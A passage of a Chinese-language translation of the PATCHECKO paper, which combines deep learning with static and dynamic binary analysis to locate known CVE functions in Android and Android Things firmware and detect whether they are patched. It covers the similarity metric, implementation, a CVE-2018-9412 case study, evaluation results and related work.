<p>对于每个函数对(f,g)，PATCHECKO基于它们的动态特征向量距离计算出语义相似度。距离通常被用于代表在数据挖掘时对象特征的维度。值得一提的是，对于每个函数的特征向量，PATCHECKO使用了闵氏距离(Minkowski Distance)作为测量相似度的方法。不同的参数会导致特征向量中相应的坐标值有轻微差异，我们现在详细讨论一下距离的测量。<br>
闵氏距离是欧氏距离(Euclidean Distance)和曼哈顿距离(Manhattan distance)的一般化形式（闵氏距离中的p=2时即为欧氏距离，p=1时即为曼哈顿距离）。在我们的项目中，将闵氏距离的p设为3。闵氏距离公式的一般式如下：<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210919171915.png" alt="20210919171915"><br>
在这个闵氏距离公式中，f代表了CVE函数，g代表目标固件中的候选函数，k指的是用到了第k个执行环境，x和y分别代表f和g的动态特征向量，此时P设为3。<br>
我们计算了每一对(f,g)在多种执行环境下的相似度，然后算出所有执行环境中的平均值得到最终结果。设k为执行环境的编号，我们定义：<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210919180346.png" alt="20210919180346"><br>
最后，我们将每个候选函数的动态特征向量送入相似度计算的方程中，得到一系列（函数和相似性距离）的排名对（见图5）。这是检测已知漏洞的最后一步，现在我们开始设计检测补丁是否存在的最后一个步骤。</p>
<h2 id="D-补丁检测">D.补丁检测</h2>
<p>我们注意到一个补丁通常只对漏洞函数引入了一点点改变，然而这些细微的改变仍然可以对修复前和修复后的函数造成明显影响，使它们存在一定差异-这一观点会在第Ⅴ节得到证实。基于这个概念，PATCHECKO使用了一个差分引擎来收集静态和动态相似性检测结果，来判断一个漏洞函数是否被修复了。<br>
对于给定的漏洞函数f<sub>v</sub>、已修复函数f<sub>p</sub>和目标函数f<sub>t</sub>，差分引擎会首先生成三个值：f<sub>v</sub>、f<sub>p</sub>和f<sub>t</sub>的静态特征、sim<sub>v</sub>与sim<sub>t</sub>、sim<sub>p</sub>与sim<sub>t</sub>的动态语义相似性得分以及S<sub>v</sub>和S<sub>p</sub>之间的差分特征（differential signatures）。静态特征即上述的48个不同的量化特征，动态语义相似度得分与上述的函数相似度指标。差分特征（differential signatures）是一个用于比较CFG结构的附加指标，即两个函数的CFG拓扑以及语义信息，例如函数参数、局部变量和库函数调用。</p>
<h1>Ⅳ.实现及案例研究</h1>
<p>我们将PATCHECKO框架部署在了Ubuntu18.04-amd64上，实验过程在一个配有 Intel Xeon E5-1650v4 、 128GB 内存、 2TB SSD 和 4块 NVIDIA 1080Ti GPU 的服务器上进行，在训练和评估过程中，4块GPU均被使用到了。在设计中，PATCHECKO由四个主要部分组成：特征提取器、深度学习模型、动态分析引擎和用于补丁检测的差异分析引擎。</p>
<h2 id="A-特征提取和深度学习">A.特征提取和深度学习</h2>
<p>特征提取器接收的输入是目标函数的反编译代码。我们默认 IDA Pro （一个用于提取二进制程序特征的商用反编译器）识别出的函数边界是可用且正确的。因此，我们将特征提取器作为 IDA Pro 的一个插件。我们开发出了插件的两个版本：一个带GUI，另一个使用命令行（用于自动化）。因为PATCHECKO的目标是跨平台的二进制文件，所以插件可以支持对不同架构（x86、amd64和arm 32/64 bit）进行特征提取。<br>
我们基于Keras和TensorFlow实现了神经网络的建模、训练和分类，使用TensorBoard来实现整个训练过程的可视化。</p>
<h2 id="B-动态分析引擎">B.动态分析引擎</h2>
<p>正如在** 设计** 一节中描述的，动态分析的关键挑战是给分析引擎准备输入和在目标函数执行时跟踪动态信息。<br>
<strong>输入准备。</strong> 正如在第Ⅲ节-B部分提到的，PATCHECKO需要高效地准备执行环境。为了不必装载整个二进制文件就能进行动态分析，我们使用了DLL注入来执行一个只表示单一目标函数的压缩的可执行文件。我们使用了动态加载函数（如dlopen()）来加载动态链接文件，它返回了一个被加载对象的句柄，这个句柄随后被dlopen API中的其他函数使用，例如可以把返回值传给dlsym，通过函数名找到函数的地址，进而能够运行目标函数。<br>
当然，库函数文件包含了大量函数，其中一些是非导出函数（non-exported functions），为了后续的分析，PATCHECKO使用LIEF将这些函数导出。这样PATCHECKO就能够通过 dlopen() 和 dlsym() 找到库函数地址，执行并跟踪所有候选函数，而不需要运行整个程序。这个方法的可靠性极好且效率极高，我们因此可以关注于目标函数而不需处理整个程序。同时，我们使用了LibFuzzer对候选函数进行模糊测试，生成了不同的输入集。对于执行环境，我们人工地为不同的全局变量选择了具体的初始值。<br>
<strong>检测框架。</strong> 因为目标是异构的移动/物联网生态系统，因此我们选择将PATCHECKO的动态检测工作放在 IDA Pro 和 GDB 上。我们还为安卓和Android Things平台写了一个GDB和GDBServer的插件，为IOS平台写了一个IDA Pro和debugserver的插件。</p>
<h2 id="C-案例分析">C.案例分析</h2>
<p>为了能更好理解这一方法的细节，我们提供了一个例子来展示如何在Android Things固件上定位一个已知的CVE漏洞以及如何确定某个漏洞是否被修复。Android Things是谷歌一个专为嵌入式IoT设备设计的操作系统。<br>
<strong>挖掘已知CVE漏洞函数。</strong> 我们选用了一个Android Security Bulletins上的漏洞：CVE-2018-9412，一个位于libstagefright库removeUnsynchronization函数中的DoS漏洞。为了方便进行案例分析，我们直接使用Clang从含有漏洞的和修复过的libstagefright库源码中编译出二进制文件，优化级别设置为O0。图6展示了该漏洞触发点的源代码和汇编代码，我们将在接下来的小节中对这个图的几个部分进行进一步描述。<br>
<strong>生成训练数据集。</strong> 我们使用Clang从安卓函数库里编译了100个库的代码，目标架构包括x86、amd64、ARM 32-bit和ARM-64bit，优化级别涵盖O0、O1、O2、O3、Oz和Ofast，最终获得了2108个二进制库文件。更多相关细节将在第Ⅴ节呈现。<br>
<strong>特征提取。</strong> 我们写了一个基于IDA Pro的特征提取插件来提取特征，在获得特征后，PATCHECKO会根据它来生成特征向量。PATCHECKO从libstagefright.so的所有函数特征里识别出了5646个函数，并将其全部转换为函数特征向量。<br>
<strong>通过深度学习进行漏洞检测。</strong> 将特征提取出来后，我们使用训练的模型进行检测，以漏洞函数和已修复函数作为基准。该模型基于漏洞函数的特征向量识别出了252个候选函数，基于已修复函数识别出了971个候选函数。我们也比较了漏洞函数和已修复函数的特征向量以检查它们是否相似，结果表明两个特征向量并不相似，例如图6中可以看出两者具有明显不同，修复过程移除了memmove函数，并对数值进行了检查和判断。同样的，也可以在汇编层面上观察到基本块数量的差异。</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master//blog/20211012230244.png" alt="20211012230244"></p>
<p><strong>动态分析引擎。</strong> 候选漏洞函数和已修复函数不仅在数量上较多，而且候选函数之间的相似度也较高，导致难以通过人工定位目标漏洞函数。对此我们使用了动态分析引擎来生成每个函数的动态信息。我们首先使用LibFuzzer生成函数removeUnsynchronization()的不同输入数据，并测试证明它们都能正常运行于漏洞函数和已修复漏洞的函数。和之前一样，我们使用这些数据来测试每个候选函数，筛去执行过程中崩溃的函数。通过这步验证，我们获得了38个候选漏洞函数和327个候选已修复函数。对于这些候选函数，PATCHECKO的动态分析引擎将生成动态信息。对于在Android Things上的插桩，我们使用gdbserver获取Android Things设备上的动态特征。表Ⅲ展示了部分漏洞函数的动态特征向量的分析。在下一小节，我们分析了为什么<em>candidate_29</em>是漏洞函数</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master//blog/20211029225224.png" alt="20211029225224"></p>
<p><strong>计算函数相似度。</strong> 我们使用三个之前提到过的指标来计算函数间的相似度。在表Ⅳ中列出了相似度前十的漏洞函数，表Ⅴ列出了相似度前十的已修复函数。对于表Ⅳ，其中我们看到candidate_29函数排在第一位。根据相似度距离算法，如果距离较小，则对应的相似度就较高。可以看到这个函数和排在它后一位的candidate_27存在较大差距。我们因此得到结论，candidate_29就是漏洞函数。</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master//blog/20211029225207.png" alt="20211029225207"></p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master//blog/20211030053720.png" alt="20211030053720"></p>
<p>进一步观察表Ⅲ的结果，我们可以看出为什么动态特征之间的距离非常小。表中两行高亮的数据分别是candidate_29和基准漏洞函数。在表Ⅱ中，我们已知F_13表示同一分支指令的最大频率，F_14代表同一算术指令的最大频率。注意到candidate_29是唯一一个和基准漏洞函数具有相同频率的候选函数。值得一提的是这个分析只在动态分析的时候进行，静态分析的时候无法收集到这些特征。</p>
<p>对于检测已修复函数，表Ⅴ由于篇幅限制仅展示了排名结果前十的候选函数。在本测试结果中，candidate_102排在第一位，不过它对应了错误的函数。然而注意到排在第二的candidate_29，它的Sim值比第三名要小得多。直观的说，我们可以将范围缩小到这两个候选函数，并且可以猜测candidate_29可能是候选漏洞函数。然而目前我们还不能确定这个函数是否是已修复函数。</p>
<p><strong>差分分析引擎。</strong> 基于前面的步骤，我们可以确定candidate_29即是目标函数，但仍旧不知道它是否被修复了。我们收集了静态特征（例如j__aeabi_memmove），动态语义相似性得分（34.7 对 65.6）和差分特征（differential signatures）（j__aeabi_memmove里的if条件）。差分分析引擎随后根据这些指标分析出目标函数是否被已被修复。</p>
<h1>Ⅴ.评估</h1>
<p>在这一节，我们将从搜索的准确度和计算效率来评估PATCHECKO。我们还评估了深度学习模型、动态分析引擎和差分分析引擎的准确度。</p>
<h2 id="A-数据集准备">A.数据集准备</h2>
<p>在评估中，我们收集了三个数据集：1）数据集Ⅰ主要用于训练深度学习模型以及评估模型准确性；2）数据集Ⅱ用于收集已知CVE漏洞，用于构建漏洞函数数据库；3）数据集Ⅲ用于评估深度学习模型、动态分析引擎和差分分析引擎在分析真实移动/物联网固件时的准确性和性能。</p>
<p><strong>数据集Ⅰ：</strong> 这个数据集用于进行神经网络训练和基线比较（baseline comparison）。它包含了从源代码编译来的二进制代码，为我们提供了基准数据（ground truth）。我们假设从相同源码中生成的两个函数是相似的，不同源码中生成的函数是不相似的。我们使用Clang从Android-8.1.0_r36的源码中编译了100个库函数，每个库根据不同的目标平台（ x86, AMD64, ARM 32bit， ARM 64bit ISA）、优化级别（O0, O1, O2,O3, Oz, Ofast）生成了23个不同的二进制文件。不过，并不是每个库函数都可以用六种优化级别进行编译（如libbrillo, libbacktrace,libtextclassifier, libmediaplayerservice）。我们总共获得了2108个库文件，包含了2037772个函数特征样本，其中每个二进制文件都是debug版本，方便我们基于符号名建立基准数据。在后续测试时，我们生成的是受限的Release版本。</p>
<p><strong>数据集Ⅱ：</strong> 我们的目标是进行评估漏洞，因此我们生成了包含漏洞函数和已修复漏洞函数的数据库，其中包含了函数的动态特征向量和静态特征向量。漏洞函数数据集来自Android Security Bulletins，包括了从2016年7月到2018年11月的漏洞。这个数据库涵盖2076个漏洞，其中有1351个高危漏洞和381个关键漏洞。</p>
<p><strong>数据集Ⅲ：</strong> 为了评估PATCHECKO，我们收集了不同的固件映像，包括多个版本的Android、Android Things 和 IOS。其中，我们选择了Android Things 1.0 和 Google Pixel 2 XL (Android 8.0) 的两个固件映像作为目标。对于漏洞检测，我们考虑了2018年中修复的 Android 8.0和8.1 上的漏洞，最终从我们的数据库中选择了25个CVE漏洞用来对我们的方案进行评估。</p>
<h2 id="B-训练模型">B.训练模型</h2>
<p>我们的深度学习模型使用了6层的序列模型，使用数据集Ⅰ进行训练。我们首先为每一层指定输入。第一层接受的是输入张量的形状（input shape）的信息。在我们的实验中，它的值是96。我们将数据集Ⅰ的所有函数分解为3个不相交子集，分别用于训练（1222663个）、校验（407554个）和测试（407555个）</p>
<h2 id="C-测试设备">C.测试设备</h2>
<p>我们对PATCHECKO的评估在两种设备上进行，一种是Android Things， 另一种是Google Pixel 2 XL。对于Android Things， 我们使用了Android Things 1.0 ，它包含了2018年5月及以前的安全补丁；对于Google Pixel 2 XL，它装载了 Android 8.0 的系统，补丁版本是2017年7月。</p>
<h2 id="D-准确性">D.准确性</h2>
<p>在这一节，我们评估了PATCHECKO的深度学习模型、动态分析引擎和补丁检测的准确性。</p>
<p><strong>深度学习模型。</strong> 图8展示了在训练了大约15小时后，深度学习模型的准确率和损失，其中准确率可达到96%。</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master//blog/20211030090924.png" alt="20211030090924"></p>
<p>根据 H. Zhang 和 Z. Qian 在 USENIX Security 18 发表的 “Precise and accurate patch presence test for binaries”，当没有符号表时，需要应用相似性检测方案来对目标函数进行定位，但如果漏洞函数和已修复函数不相似，则目标函数可能会出现遗漏。为了避免这个问题，我们使用我们的深度学习模型来验证这25个CVE漏洞对应函数的脆弱版本和已修复版本之间的相似性。结果发现该深度学习模型对漏洞函数和已修复函数之间的检测结果可能并不相似。例如，如果CVE-2018-9345被修复了，H. Zhang 和 Z. Qian 的解决方案可能会因为基于检测漏洞函数的某些功能特征而错过目标函数，导致在检测漏洞是否被修复时，检测了错误的函数。<br>
我们使用该模型对Android Things 和 Google Pixel 2XL 中的25个CVE漏洞进行检测，检测结果的平均准确率高于93%。图7展示了当我们测试两个设备固件映像的脆弱和已修复函数时的误报率。有趣的是对于CVE-2017-13209和CVE-2018-9412的误报率有明显不同。此外，我们注意到在已修复版本中，由于漏洞CVE-2017-13209已经被修复，其误报率比未修复版本低上一些。类似的，对于漏洞CVE-2018-9412的未修复版本，其误报率也比已修复版本高。然而，在表Ⅵ中，对于待检测Android Things 固件映像上含有的CVE-2017-13209漏洞，并没有在结果中被报告出来。因此，当PATCHECKO判断漏洞函数时，深度学习模型可能会遗漏正确的目标函数。但在直觉上，“根据已知漏洞检测漏洞函数可能会遗漏一个打过补丁的函数”的确是有道理的。</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master//blog/20211030074438.png" alt="20211030074438"></p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master//blog/20211030090830.png" alt="20211030090830"></p>
<p><strong>动态分析引擎。</strong> 动态分析引擎的目标是对候选函数进行删减。在表Ⅵ和表Ⅶ中，动态分析引擎的结果仅包含了<strong>Execution</strong> 和<strong>Ranking</strong> 两个指标。由于我们希望减少动态特征分析时候选函数的数量，因此对这些函数使用了具体的输入值来验证候选函数。只要候选函数能够通过输入的测试，PATCHECKO就会对它们进行动态特征分析。例如，在深度学习后，漏洞CVE-2018-9412拥有252个候选函数，在动态分析阶段，PATCHECKO使用了多种不同的值对这些函数进行测试，最后留下了38个函数进行动态特征分析。最后，PATCHECKO计算了函数的相似性得分。表Ⅵ和表Ⅶ表明在PATCHECKO的结果中，每一次都能将目标函数排在前三位，除了对于CVE-2017-13209，它在深度学习阶段就把目标函数排除了。</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master//blog/20211030082128.png" alt="20211030082128"></p>
<p><strong>补丁检测。</strong> 根据差分特征、静态语义特征和表Ⅵ、表Ⅶ的结果，PATCHECKO生成了最终结果表Ⅷ。其中只遗漏了CVE-2018-9470，原因是漏洞函数和修复函数仅差了一个整数。</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master//blog/20211030090706.png" alt="20211030090706"></p>
<p><strong>局限。</strong> 如果漏洞函数和已修复函数之间的差异非常微小，我们的相似性检测可能无法捕捉到它们之间的差异，例如实验中的CVE-2018-9470。这个遗漏是因为两个函数的静态特征和动态特征没有表现出差异。一个解决方法是加入已知漏洞利用中更细粒度的特征。然而即使这个假设是可行的，也还需要在方案通用性上进行进行权衡。</p>
<h2 id="E-执行耗时">E.执行耗时</h2>
<p>表Ⅵ和表Ⅶ分别列出了对漏洞函数和已修复函数执行深度学习检测和动态分析所用的时间。深度学习检测阶段平均花费3秒，而进行动态分析所需要的时间则取决于候选函数和执行环境的数量。例如，由于在候选函数数量上存在较大差异（72个），导致CVE-2017-13208花费的时间要比CVE-2017-13182少很多。在动态分析时，PATCHECKO会引导候选函数对应的执行环境，这些环境是并发运行的。目前PATCHECKO并行了所有执行环境，未来的工作将侧重于并行执行每个环境中的每个候选函数，以进一步减少动态分析所需的时间。</p>
<h1>Ⅵ.相关工作</h1>
<p>我们简单的概括一下相关的工作。我们专注于使用代码相似性的方法来检测已知漏洞，而不需要访问源代码，因此这一节不会讨论挖掘未知漏洞和基于源码进行检测的方法。我们将相关的工作分为基于编程语言的方案和基于机器学习的方案。</p>
<p><strong>基于编程语言的方案。</strong> 之前的研究者在“如何检测两段语法不同的代码在语义上是否相同”这一问题上已经做了不少研究。有很多传统的方法都是基于对函数的CFG进行匹配。Bindiff基于代码句法对节点进行匹配。Bindiff先恢复两个二进制文件的CFG，然后使用启发式算法来规范和匹配图中的顶点。在“Leveraging semantic signatures for bug search in binary programs”中，每个CFG的顶点都用一个表达式树进行表示，顶点之间的相似性通过使用对应表达式树之间的编辑距离来计算。关注于跨平台二进制代码相似性检测的方法“discovre: Efficient cross-architecture identification of bugs in binary code”在CFG上应用了基于图的匹配算法。其思想是把二进制代码转换为中间表示，通过使用随机的输入来执行代码并进行采样来生成每个CFG顶点的语义。在理论方面，“Scalable graph-based bug search for firmware images” 和“Neural network-based graph embedding for cross-platform binary code similarity detection”从CFG中提取特征表示，并将它们进行图嵌入，以加快匹配过程。最近的研究“Rendezvous: A search engine for binary code”和“Expose: Discovering potential binary code reuse”也使用了类似的静态分析技术。<br>
动态二进制代码分析是另一个检测函数相似性的方法。Binhunt使用符号执行和定理证明(theorem proving)来区分动态的二进制函数，以测试基本块的语义差异。然而这个方法仅关注了基本块，但两个函数有可能在功能上一致，可是由于编译器优化的原因生成了不同的基本块。Egele等人提出了一种动态等价测试基元，通过覆盖预期的程序逻辑来实现完全覆盖(“Blanket execution:Dynamic similarity testing for program binaries and components”)，它收集了函数在受控的随机环境下执行过程中产生的副作用，如果两个函数的副作用相似，那么它们就有可能是相似的。然而这是一个较为耗时的方法，需要以不同输入对每个函数进行多次执行。</p>
<p><strong>基于机器学习的方案。</strong> 基于深度学习的图嵌入方法也被用于进行二进制相似性检查。目前最前沿的“Neural network-based graph embedding for cross-platform binary code similarity detection”在目标二进制文件中的所有函数集合中寻找相同的受影响的函数；“αdiff:cross-version binary code similarity detection with dnn”利用机器代码来计算其神经网络模型的最佳参数；“Asm2vec: Boosting static representation robustness for binary clone search against code obfuscation and compiler optimization”和“Neural machine translation inspired binary code similarity comparison beyond function pairs”都使用了NLP来替代人工进行特征选择。然而，当规模增大后，会导致候选函数增加。PATCHECKO可以结合动态分析对候选函数进行删减并减少误报。<br>
Zhang等人提出了一个新颖的角度(“Precise and accurate patch presence test for binaries”)，利用源码级别的信息来检测目标二进制文件中某个函数是否被修复了。然而它需要源代码以及上面提到的相似性检测方案来定位目标函数。PATCHECKO使用深度学习和动态二进制分析来定位目标函数，并进行准确的补丁检测。</p>
<h1>Ⅶ.结论</h1>
<p>我们提出了漏洞评估框架PATCHECKO，它使用深度学习和混合了静态、动态二进制分析来进行跨平台二进制代码相似性分析，在无法获得源代码的情况下以高精度识别已知漏洞，此外，它可以使用差分引擎来区分漏洞函数和补丁函数。我们针对多种优化级别和目标架构编译了 Google Pixel XL2 和 Android Things 固件映像中的25种CVE漏洞函数，并用它们对PATCHECKO进行评估。结果表明我们的深度学习模型识别漏洞的准确率超过93%。<br>
我们还展示了如何在受控环境下对漏洞函数进行动态分析，以减少误报。在所有测试结果中，PATCHEKO都能将正确的结果输出在排名的前三名之中。此外，它的差分引擎以96%的准确率区分了漏洞函数和已修复函数。</p>
]]></content>
  </entry>
</search>
